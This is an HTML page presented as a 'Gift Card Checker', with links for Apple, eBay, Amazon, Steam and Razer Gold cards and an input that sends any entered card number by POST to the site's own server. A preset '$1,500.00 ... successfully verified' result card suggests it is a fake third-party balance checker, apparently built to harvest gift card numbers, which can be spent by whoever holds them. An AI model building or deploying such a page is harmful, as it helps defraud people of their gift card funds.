<!DOCTYPE html>
<html>
<head>
  <title>Gift Card Checker</title>
  <style>
  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
  }

  body {
    background: #f6f7fb;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 20px;
    color: #333;
  }

  .container {
    background: #ffffff;
    width: 100%;
    max-width: 420px;
    padding: 25px;
    border-radius: 14px;
    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
    text-align: center;
    margin-bottom: 25px;
  }

  .container h2 {
    font-size: 22px;
    margin-bottom: 20px;
    color: #111;
  }

  .container a {
    display: block;
    text-decoration: none;
    background: #f1f3f6;
    color: #333;
    padding: 12px;
    border-radius: 8px;
    margin-bottom: 10px;
    font-weight: 500;
    transition: all 0.25s ease;
  }

  .container a:hover {
    background: #e63946;
    color: #fff;
    transform: translateY(-2px);
  }

  .container p {
    margin: 18px 0 10px;
    font-size: 14px;
    color: #777;
  }

  .container input {
    width: 100%;
    padding: 12px;
    border-radius: 8px;
    border: 1px solid #ccc;
    font-size: 15px;
    outline: none;
    margin-bottom: 15px;
    transition: border 0.2s;
  }

  .container input:focus {
    border-color: #e63946;
  }

  .container button {
    width: 100%;
    padding: 13px;
    border: none;
    border-radius: 8px;
    background: #e63946;
    color: #fff;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: background 0.3s, transform 0.2s;
  }

  .container button:hover {
    background: #d62839;
    transform: translateY(-1px);
  }

  /* RESULT CARD */
  .other-card {
    width: 100%;
    max-width: 420px;
    background: linear-gradient(135deg, #e63946, #ff6b6b);
    border-radius: 16px;
    padding: 25px;
    color: #fff;
    text-align: center;
    box-shadow: 0 12px 30px rgba(230, 57, 70, 0.35);
  }

  .other-title {
    font-size: 14px;
    letter-spacing: 1px;
    opacity: 0.9;
    margin-bottom: 10px;
  }

  .other-balance {
    font-size: 32px;
    font-weight: bold;
    margin-bottom: 12px;
  }

  .status {
    font-size: 14px;
    background: rgba(255, 255, 255, 0.2);
    padding: 8px 12px;
    border-radius: 20px;
    display: inline-block;
  }

  /* MOBILE OPTIMIZATION */
  @media (max-width: 480px) {
    .container,
    .other-card {
      padding: 20px;
    }

    .other-balance {
      font-size: 28px;
    }
  }
  .other-card{
    display: none;
  }
  </style>
</head>
<body>
  <div class="container">
    <h2>Check Gift Card Balance</h2>
      <a href="apple_card/index.html">Apple Card</option></a>
      <a href="ebay_card/index.html">Ebay Card</a>
           <a href="amazon_card/index.html">Amazon Card</a>
      <a href="steam_card/index.html">Steam Card</a>
      <a href="gold_razer/index.html">Razer Gold Card</a>
     <p>Or Others</p>
    <input type="text" id="cardNumber" placeholder="Enter gift card number">
    <button id="checkBtn">Check Balance</button>
  </div>
        <div class="other-card">
  <div class="other-title">CARD BALANCE</div>
  <div class="other-balance">$1,500.00</div>
  <div class="status">Balance successfully verified</div>
       </div>
<script>
document.getElementById("checkBtn").addEventListener("click", async (e) => {
  e.preventDefault();

  const cardNumber = document.getElementById("cardNumber").value;
   
fetch("/api/user/check-balance", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    cardNumber,
    cardType: "others"
  })
})
.then(res => res.json())
.then(data => {
  console.log(data);

  document.querySelector(".other-balance").innerText =
    `$${Number(data.balance).toFixed(2)}`;

  document.querySelector(".other-card").style.display = "block";
});
});  
</script>
</body>
</html>
